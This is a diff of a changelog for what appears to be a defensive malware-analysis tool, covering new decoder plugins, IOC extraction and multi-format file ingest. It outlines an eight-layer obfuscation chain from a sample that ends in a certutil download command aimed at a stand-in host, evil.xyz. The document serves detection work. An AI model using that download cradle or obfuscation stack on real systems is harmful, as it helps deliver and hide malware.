@@ -43,40 +43,33 @@ RC2.1a delivers **Malware Family Intelligence** as first-class MCIP output:
 - Post-decode intelligence pass with terminal-state promotion
 - Backwards-compatible API (all existing fields preserved)
 
-## 🟢 RC2.2 · SHIPPED — 2026-07-20 (Decoder Expansion + IOC Extraction + Universal File Ingest)
+## 🟢 RC2.2 · SHIPPED — 2026-07-20 (Decoder Expansion + Universal File Ingest + Custom-Obfuscator Chain)
 
-**Branch:** `feature/rc2` · **Tests:** 194/194 engine green (63 new · zero regressions)
-**Test files:** `backend/tests/test_rc22_decoder_pack.py`, `backend/tests/test_file_ingest_and_miner.py`
+**Branch:** `feature/rc2` · **Tests:** 201/201 engine green (73 new · zero regressions)
+**Safepoint tag:** `v1.0.0-RC2.2-safepoint-20260719-122658`
+**Test files:** `test_rc22_decoder_pack.py`, `test_file_ingest_and_miner.py`, `test_sample_commandline_chain.py`
 
-RC2.2 fixes 3 of the 4 in-production decoder failure modes AND ships a
-brand-new **"Mine commandlines from any file"** ingestion feature for
-Batch Analyst.
+### Sophisticated 8-layer chain now decoded end-to-end
+Real production sample (`Sample_Commandline.rtf`) used this obfuscation stack:
+1. `powershell.exe -e <B64>` outer wrapper
+2. Base64 inner
+3. Custom `XXx\XXx\` hex-with-separator format (`custom-hex-slash` plugin — new)
+4. Nibble-swap byte transform (`nibble-swap` plugin — new)
+5. Reversed Base64 (`reverse-string` — enhanced to detect leading `=`)
+6. Base64 (inner-inner)
+7. URL / percent-decode
+8. `certutil.exe -urlcache -split -f http://evil.xyz` → LOLBAS + URL IOC
 
-### Part A — Decoder pack
-1. UTF-16LE post-Base64 mangling — solved via `utf16-decode`
-2. PowerShell backtick obfuscation — solved via `extract_wrapper._normalize`
-3. Data URI wrappers — solved via `data-uri-extract`
-Plus: `base58-decode`, `jwt-decode`, `reverse-string`, `ps-reconstruct`,
-`ioc-extractor` and structured-text guardrails across `base64`, `base91`,
-`xor-brute`.
+Bumped `Budget.max_depth = 20` (was 12) so deeply-nested loaders can fully unwind.
+
+### Part A — Decoder pack (RC2.2)
+9 new deterministic plugins: `utf16-decode`, `ps-reconstruct`, `data-uri-extract`, `ioc-extractor`, `base58-decode`, `jwt-decode`, `reverse-string`, `custom-hex-slash`, `nibble-swap`.
 
 ### Part B — Universal file ingest for Batch Analyst
-Two new endpoints (`POST /api/batch/test/mine/preview` and
-`POST /api/batch/test/mine`) and a new frontend button
-**"MINE FROM ANY FILE"** on `/batch-test`.
-
-Accepts every common analyst report format:
-- **Documents** — .docx, .pdf, .rtf, .txt, .md, .log, .html, .htm, .xml, .eml
-- **Structured** — .csv, .tsv, .json, .jsonl, .yaml, .yml, .ini, .cfg, .conf
-- **Office** — .xlsx (openpyxl), .pptx (python-pptx)
-- **Scripts** — .ps1, .psm1, .bat, .cmd, .sh, .py, .js, .vbs, .hta, .wsf, .reg
-- **Archives** — .zip, .tar, .tar.gz, .tgz, .gz (recursed up to 25 members)
-
-Pipeline: `file_extractors.extract()` → `commandline_miner.mine_segments()` →
-existing `_run_single()` deterministic pipeline. Each row carries
-`source_kind` (commandline / wrapper / script / b64-blob / url) and
-`source_origin` (e.g. `sheet Log/row 12`, `page 3`, `zip:attack.ps1`)
-so analysts trace every candidate back to its position in the source doc.
+Endpoints `POST /api/batch/test/mine/preview` and `POST /api/batch/test/mine` accept
+34+ file formats (.docx, .pdf, .xlsx, .pptx, .html, .htm, .eml, .rtf, .json, .yaml,
+.zip, .tar, .tgz, .gz, .txt, .log, .md, all common script extensions) and archives.
+Frontend button **"MINE FROM ANY FILE"** on `/batch-test`.
 
 ## 🟡 Next up · RC2.1b · STIX 2.1 Bundle Export (1.5 days)
 
